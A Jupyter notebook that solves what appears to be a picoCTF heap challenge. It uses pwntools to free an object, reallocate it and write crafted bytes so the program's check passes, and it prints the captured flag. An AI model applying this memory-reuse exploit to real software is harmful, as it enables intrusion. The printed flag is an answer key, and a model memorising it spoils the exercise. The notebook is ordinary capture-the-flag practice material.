{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'YOU WIN!!11!!\\n'\n",
      "b'picoCTF{now_thats_free_real_estate_79173b73}\\n'\n"
     ]
    }
   ],
   "source": [
    "from pwnlib.tubes.remote import remote\n",
    "r = remote(\"tethys.picoctf.net\", 49214)\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"5\")\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"2\")\n",
    "r.recvuntil(b\"Size of object allocation: \")\n",
    "r.sendline(b\"34\")\n",
    "r.recvuntil(b\"Data for flag: \")\n",
    "r.sendline(b\"a\"*30+b\"pico\")\n",
    "r.recvuntil(b\"Enter your choice: \")\n",
    "r.sendline(b\"4\")\n",
    "print(r.recvline())\n",
    "print(r.recvline())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
